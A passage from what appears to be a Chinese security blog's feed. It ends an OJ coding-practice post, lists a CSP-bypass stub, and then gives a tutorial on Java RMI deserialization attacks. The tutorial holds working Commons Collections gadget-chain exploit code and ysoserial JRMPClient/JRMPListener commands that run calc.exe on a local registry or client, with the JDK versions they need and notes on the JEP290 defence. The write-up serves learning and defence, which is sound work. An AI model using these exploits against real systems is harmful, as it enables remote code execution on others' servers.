class="comment">// 大数改小数</span></span><br><span class="line">            b = n;      <span class="comment">// 小数改更小</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;       <span class="comment">// 最后返回小的数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点-2"><a href="#题目坑点-2" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li>记住<strong>辗转相除法</strong>的返回值是小的数而非余数。</li><li>记住计算最小公倍数的公式。</li></ul><h3 id="4-漂亮度"><a href="#4-漂亮度" class="headerlink" title="4. 漂亮度"></a>4. 漂亮度</h3><h4 id="题目概述-3"><a href="#题目概述-3" class="headerlink" title="题目概述"></a>题目概述</h4><p>挺有意思的，思路就是统计字母个数，最多个数的占最大漂亮度然后依此类推。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">给出一个名字，该名字有26个字符串组成，定义这个字符串的“漂亮度”是其所有字母“漂亮度”的总和。</span></span><br><span class="line"><span class="comment">每个字母都有一个“漂亮度”，范围在1到26之间。没有任何两个字母拥有相同的“漂亮度”。字母忽略大小写。</span></span><br><span class="line"><span class="comment">给出多个名字，计算每个名字最大可能的“漂亮度”。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输入描述:整数N，后续N个名字</span></span><br><span class="line"><span class="comment">输出描述:每个名称可能的最大漂亮程度</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">示例1</span></span><br><span class="line"><span class="comment">输入：</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">zhangsan</span></span><br><span class="line"><span class="comment">lisi</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">192</span></span><br><span class="line"><span class="comment">101</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> Normal.Beauty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="keyword">int</span> num = scanner.nextInt();</span><br><span class="line">        String[] names = <span class="keyword">new</span> String[num];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            Scanner scanner1 = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">            names[i] = scanner1.nextLine();</span><br><span class="line">            <span class="comment">// System.out.println(names[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            beauty(names[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">beauty</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; hm = <span class="keyword">new</span> HashMap&lt;Character, Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> ch:name.toCharArray())&#123;</span><br><span class="line">            <span class="keyword">if</span>(hm.containsKey(ch))&#123;</span><br><span class="line">                hm.put(ch,hm.get(ch)+<span class="number">1</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                hm.put(ch,<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Collection&lt;Integer&gt; coll = hm.values();</span><br><span class="line">        List&lt;Integer&gt; nums = <span class="keyword">new</span> ArrayList&lt;Integer&gt;(coll);</span><br><span class="line">        Collections.sort(nums);     <span class="comment">// 对所有的出现次数进行排序</span></span><br><span class="line">        <span class="keyword">int</span> N=<span class="number">26</span>;   <span class="comment">// 每个字母漂亮度</span></span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;  <span class="comment">// 每个名字总漂亮度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=nums.size()-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            sum+=N*nums.get(i);     <span class="comment">// 取最后一个元素即次数最多的字母</span></span><br><span class="line">            N--;    <span class="comment">// 次多的字母漂亮度一次递减</span></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目坑点-3"><a href="#题目坑点-3" class="headerlink" title="题目坑点"></a>题目坑点</h4><ul><li>以前都写的其他语言没使用过HashMap，类似于Python的<strong>字典</strong>，注意实例化的方法。</li><li>containsKey：判断HashMap中是否存在索引。</li><li>put：往HashMap中传入键值对。</li><li>get：通过索引获取其对应得值。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OJ刷题记录&quot;&gt;&lt;a href=&quot;#OJ刷题记录&quot; class=&quot;headerlink&quot; title=&quot;OJ刷题记录&quot;&gt;&lt;/a&gt;OJ刷题记录&lt;/h1&gt;&lt;p&gt;菜，刷。两个字。大部分题目放在本地的IDEA中了，这里只是贴上一些老是忘记的点。&lt;/p&gt;
&lt;h2 id=&quot;0
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>CSP绕过</title>
    <link href="http://bai-ren-1.github.io/2020/07/26/CSP%E7%BB%95%E8%BF%87/"/>
    <id>http://bai-ren-1.github.io/2020/07/26/CSP%E7%BB%95%E8%BF%87/</id>
    <published>2020-07-26T07:07:33.000Z</published>
    <updated>2020-07-26T07:16:07.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a>CSP绕过</h1><p>第一次被提及是面试的时候，这一下都过了这么久了。记录一下绕过吧。</p><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>直接附上官网的解释： <a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/Introducing_Content_Security_Policy" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/Introducing_Content_Security_Policy</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CSP绕过&quot;&gt;&lt;a href=&quot;#CSP绕过&quot; class=&quot;headerlink&quot; title=&quot;CSP绕过&quot;&gt;&lt;/a&gt;CSP绕过&lt;/h1&gt;&lt;p&gt;第一次被提及是面试的时候，这一下都过了这么久了。记录一下绕过吧。&lt;/p&gt;
&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a h
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>反序列化之RMI</title>
    <link href="http://bai-ren-1.github.io/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/"/>
    <id>http://bai-ren-1.github.io/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/</id>
    <published>2020-07-25T01:53:51.000Z</published>
    <updated>2020-07-26T03:37:01.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反序列化之RMI"><a href="#反序列化之RMI" class="headerlink" title="反序列化之RMI"></a>反序列化之RMI</h1><p>前段时间的反序列化都是介绍了怎么触发，怎么构造利用链进行命令执行。但是要达成RCE效果，这个R如何做到还得继续学习。</p><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p> JAVA本身提供了一种<strong>RPC框架RMI</strong>及Java 远程方法调用，可以在不同的Java 虚拟机之间进行对象间的通讯 。 RMI是基于<strong>JRMP协议</strong>实现的。下面是RMI的调用逻辑： </p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/1.png" alt></p><p>由上图可以看出RMI主要分为三部分：</p><ul><li>RMI Registry注册中心</li><li>RMI Client 客户端</li><li>RMI Server服务端</li></ul><h2 id="0x01-初探"><a href="#0x01-初探" class="headerlink" title="0x01 初探"></a>0x01 初探</h2><blockquote><p>虽然这里RMI的三部分都是在本机上执行的，但是得理解好Remote表现在哪个地方。这里就直接贴代码，个人运行环境是JDK1.7.80版本。</p></blockquote><p>首先我们先看下普通利用RMI的每个部分的代码是怎么编写的以及其目录结构：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/6.png" alt></p><blockquote><p>这里定义了四个类和一个接口，从上到下分别代表着客户端、注册类、注册类接口、服务端和注册中心。</p></blockquote><h3 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h3><p>注册中心启动类Registry：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class Registry &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        while (true) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>远程接口HelloInterface：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface HelloInterface extends java.rmi.Remote &#123;</span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>远程接口实现类HelloImpl用来绑定到注册中心上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class HelloImpl extends UnicastRemoteObject implements HelloInterface &#123;</span><br><span class="line">    public HelloImpl() throws java.rmi.RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return &quot;sayHello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端启动类HelloServer：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello&quot;, new HelloImpl());</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端启动类HelloClient：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.Normal;</span><br><span class="line"></span><br><span class="line">import java.rmi.NotBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloClient &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(&quot;hello&quot;);</span><br><span class="line">            System.out.println(hello.sayHello(&quot;flag&quot;));</span><br><span class="line">        &#125; catch (NotBoundException | RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>按照执行注册中心 -&gt; 执行服务端 -&gt; 执行客户端顺序执行，可以看到以下的结果：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/2.png" alt></p><p>服务端打印出了字符串”Hello from flag”，我们看客户端执行的结果：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/3.png" alt></p><p>可见客户端执行了sayHello方法，打印出了方法中的字符串。</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>这里用自己的的话做一下过程描述：</p><ul><li>注册中心的代码通过<strong>createRegistry</strong>在1099端口开启了注册中心。</li><li>服务端定义了一个要绑定到注册中心的实现类HelloImpl。</li><li>服务端的代码通过getRegistry获取注册中心。</li><li>服务端的代码通过<strong>bind</strong>将实现类绑定到注册中心为hello。</li><li>客户端的代码通过getRegistry获取注册中心。</li><li>客户端的代码通过<strong>lookup</strong>找到注册中心上绑定为hello的类然后调用sayHello。</li></ul><blockquote><p>客户调用sayHello为什么是在客户端上执行？客户端只是获取了一个返回结果？</p><p>这个就是一个重点：RMI服务端提供的方法，<strong>被调用的时候该方法是执行在服务端</strong> 。</p></blockquote><h2 id="0x02-打法"><a href="#0x02-打法" class="headerlink" title="0x02 打法"></a>0x02 打法</h2><p>介绍完RMI的调用过程，主要还是为这个篇章做好铺垫，实现在这个RMI调用过程来攻击远程机器？下面代码因为我没搭建依赖环境，还是按照CC链分析的博客把ysoserial-master-30099844c6-1作为依赖库引入。</p><h4 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="headerlink" title="服务端攻击注册中心"></a>服务端攻击注册中心</h4><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/7.png" alt></p><blockquote><p>这种攻击方式可以只涉及服务端和注册中心，所以这里只实现了这两个类而没有客户端类。</p></blockquote><p>服务端代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ServerAttackRegistry;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = new ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap, &quot;pwn&quot;);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Map tmpMap = new HashMap();</span><br><span class="line">            tmpMap.put(&quot;pwn&quot;, badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = null;</span><br><span class="line">            ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(true);</span><br><span class="line">            InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, tmpMap);</span><br><span class="line">            Remote remote = Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello1&quot;, remote);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册中心：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ServerAttackRegistry;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class Registry &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">        &#125; catch (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        while (true) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行的结果如下，成功弹出了计算器：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/4.png" alt></p><blockquote><p>这里弹出的计算器是注册中心弹出来的。可以简单做个实验：单独运行服务端程序它会提示找不到注册中心。然后注释掉注册到注册中心的代码，直接执行代码也不会弹计算器，因为没有反序列化的触发点。</p></blockquote><p>然后我们就来总结第一种打法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMI恶意服务端通过bind、unbind、rebind接口传输精心构造的类（传输过程是序列化数据的形式）到注册中心进行绑定，使注册中心接收到数据后进行反序列化操作从而被RCE</span><br></pre></td></tr></table></figure><p>但这种攻击具有这些条件：</p><ul><li>JDK环境：6u141、7u131、80121、JEP290规范前/8u141前。</li><li>注册中心的Java包种存在利用链。</li><li>利用bind、unbind、rebind接口。</li></ul><h4 id="JRMP客户端攻击注册中心（服务端）"><a href="#JRMP客户端攻击注册中心（服务端）" class="headerlink" title="JRMP客户端攻击注册中心（服务端）"></a>JRMP客户端攻击注册中心（服务端）</h4><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/8.png" alt></p><blockquote><p>这种攻击方式利用到了ysoserial工具直接进行攻击注册中心，所以只要实现一个注册中心就可以攻击了。</p></blockquote><p>首先运行注册中心，然后使用下面命令执行ysoserial的payload，发起一次 JRMPClient攻击 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections5 &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/5.png" alt></p><p>可以看到运行之后注册中心（就是本机）被打出了一个计算器。</p><blockquote><p>这里也是演示了如果外网存在注册中心我们如何作为一个恶意JRMP客户端去使用ysoserial攻击注册中心。如果注册中心和服务端在同一台机器上实现的，那这种攻击也相当于<strong>JRMP客户端攻击服务端</strong>。</p></blockquote><p>于是总结第二种打法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">恶意JRMP客户端通过ysoserial工具构建JRMPClient就能攻击注册中心（可能同时是服务端）使其RCE</span><br></pre></td></tr></table></figure><p>但这种攻击具有这些条件：</p><ul><li>JDK环境：6u141、7u131、80121、JEP290规范前。</li><li>注册中心的Java包种存在利用链。</li><li>利用lookup接口。</li></ul><h3 id="注册中心（JRMP服务端）攻击客户端"><a href="#注册中心（JRMP服务端）攻击客户端" class="headerlink" title="注册中心（JRMP服务端）攻击客户端"></a>注册中心（JRMP服务端）攻击客户端</h3><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/19.png" alt></p><blockquote><p>这种攻击方式利用到了ysoserial工具直接进行假装注册中心，这里是模拟受害者使用lookup（这里找到是hello但是还是会被攻击）就会被反序列化RCE。如果注册中心和服务端在同一台机器上实现的，那这种攻击也相当于<strong>JRMP服务端攻击客户端</strong>。</p></blockquote><p>首先使用下面命令执行ysoserial的payload， 启动一个恶意JRMP服务端 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure><p>然后运行客户端的代码直接弹计算器，我惊了：</p><p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/9.png" alt></p><p>于是总结第三种打法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过ysoserial开启一个恶意JRMP服务端，客户端lookup到这个服务端就会被RCE</span><br></pre></td></tr></table></figure><h3 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h3><ul><li>服务端攻击Registry注册中心：  通过使用Registry连接到注册中心，然后把gadget chain对象bind注册到注册中心，从而引起注册中心反序列化RCE 。</li><li>JRMP协议客户端攻击注册中心（服务端） ： 使用JRMP协议，直接发送gadget chain的序列化数据到服务端，从而引起服务端反序列化RCE 。</li><li>JRMP协议注册中心（服务端）攻击客户端：使用JRMP协议，当客户端连上后，直接返回gadget chain的序列化数据给客户端，从而引起客户端反序列化RCE。</li></ul><blockquote><p>即是说后面两个攻击法在 <a href="https://xz.aliyun.com/t/7079#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079#toc-3</a> 中称为JRMP客户端服务端的对打；但是在天融信文章 <a href="https://paper.seebug.org/1194/" target="_blank" rel="noopener">https://paper.seebug.org/1194/</a> 中称为注册中心攻击客户端和客户端攻击注册中心。他们的示例都是一样的，所以我进行了这样的理解，比较好进行解释。</p></blockquote><h2 id="0x03-JDK的防御"><a href="#0x03-JDK的防御" class="headerlink" title="0x03 JDK的防御"></a>0x03 JDK的防御</h2><h3 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h3><p>在<code>JDK6u141</code>、<code>JDK7u131</code>、<code>JDK8u121</code>加入了JEP 290限制，JEP 290过滤策略有：</p><ul><li>自定义过滤器。</li><li>内置过滤器。</li></ul><h3 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h3><p> 可以使用自定义过滤器来重写特定流的进程级过滤器 。</p><h3 id="内置过滤器"><a href="#内置过滤器" class="headerlink" 